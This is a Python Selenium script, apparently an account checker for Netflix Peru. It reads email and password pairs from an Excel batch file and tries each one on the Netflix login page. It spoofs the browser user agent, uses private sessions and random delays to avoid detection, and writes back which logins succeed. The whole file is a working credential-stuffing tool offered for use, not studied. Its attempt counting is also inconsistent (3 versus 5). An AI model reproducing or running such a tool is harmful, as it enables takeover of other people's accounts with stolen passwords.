# %%
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.options import FirefoxProfile
import time
import pandas as pd
import random


class Xpath:
    correo = '//*[@id="id_userLoginId"]'
    contrasena = '//*[@id="id_password"]'
    btnIngresar = '//*[@id="static-login-cta"]'
    mensajeError= '/html/body/div[1]/div[1]/div[2]/div/div/div/div/div[1]'




class BotNetflix:
    def __init__(self, driver):
        self.driver = driver
            
    def open(self):
        self.driver.get("https://www.netflix.com/pe/login")
        
    def llenar(self,correo,contra):
        self.driver.find_element(By.XPATH, Xpath.correo).send_keys(correo)
        time.sleep(1)
        self.driver.find_element(By.XPATH, Xpath.contrasena).send_keys(contra)
        print(f'Correo: {correo}, Contra: {contra}')
        
    def clickIngresar(self):
        time.sleep(3)
        self.driver.find_element(By.XPATH, Xpath.btnIngresar).click()
        
        while True:
            time.sleep(0.1)
            try:
                modalMensaje  = self.driver.find_element(By.XPATH, Xpath.mensajeError) 
                if modalMensaje.is_displayed():
                    modaltext = modalMensaje.text
                    return modaltext
            except:
                pass
            try:
                #si cambia la url a una live
                #print(f'Url actual: {self.driver.current_url}')
                url_actual = self.driver.current_url
                urlLive= 'https://www.netflix.com/browse'
                if url_actual == urlLive:
                    print("Cambio Url")
                    return 'Acceso Exitoso'
            except:
                pass

def sleeper():
    tiempo_espera = random.uniform(4, 10)
    time.sleep(tiempo_espera)


if __name__ == '__main__':
    
    
    
    # Leer datos del archivo Excel
    datos = pd.read_excel('lote.xlsx', sheet_name='Hoja1', usecols='A:B')

    # Verifica si la columna 'Resultado' existe, si no, la crea
    if 'Resultado' not in datos.columns:
        datos['Resultado'] = pd.NA

    for indice, fila in datos.iterrows():
        correo = fila['Correos']
        contra = fila['Contrasenas']
        intentos = 0
        mensaje_error_especifico = "Contraseña incorrecta. Reinténtalo o actualiza el navegador para restablecer la contraseña."
        # Configurar opciones de Firefox para cada iteración
        firefox_options = Options()
        firefox_profile = FirefoxProfile()
        firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
        firefox_profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
        firefox_options.binary_location = r'C:\Program Files\Mozilla Firefox\firefox.exe'
        driver = webdriver.Firefox(options=firefox_options, firefox_profile=firefox_profile)
        
        bot = BotNetflix(driver)
        bot.open()
        valor_intentos = 3
        while intentos < valor_intentos:
            sleeper()
            bot.llenar(correo, contra)
            sleeper()
            if intentos == valor_intentos:
                print("Esperando 10 segundos como ultimo intento")
                time.sleep(10)
            resultado = bot.clickIngresar()
            print(f' > > > {resultado}')

            if resultado == mensaje_error_especifico:
                intentos += 1
                print(f"Intento {intentos}/5")
                continue
            else:
                # Si el resultado es diferente, almacena el resultado y sale del bucle
                datos.at[indice, 'Resultado'] = resultado
                driver.quit()
                break

        if intentos == 5:
            # Almacena el resultado después de 5 intentos fallidos
            datos.at[indice, 'Resultado'] = "5 intentos fallidos: " + mensaje_error_especifico

    # Guardar los resultados en el mismo archivo Excel
    datos.to_excel('lote.xlsx', sheet_name='Hoja1', index=False)


